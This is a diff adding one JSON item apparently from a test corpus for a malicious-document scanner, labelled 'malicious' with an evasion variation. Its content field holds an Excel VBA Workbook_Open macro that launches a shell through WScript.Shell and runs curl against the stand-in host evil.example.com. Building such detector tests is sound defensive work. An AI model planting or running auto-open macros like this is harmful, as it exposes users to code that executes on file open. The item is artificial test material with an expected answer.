@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::62::structural-variations::2",
+  "base_sample_id": "exp::document-office::62",
+  "generator_id": "structural-variations",
+  "generator_version": "1.0.0",
+  "seed": -1535930521,
+  "content": "Private Sub Workbook_Open()\n  CreateObject(\"WScript.Shell\").Run \"curl <!-- TODO --> http://evil.example.com/\"\nEnd Sub\n",
+  "content_hash": "775290eb6d9079d968599a54d62dcf3fe411e26c91b4862c6e46ae8b75c5835a",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "structural:html-comments",
+  "difficulty": "moderate"
+}
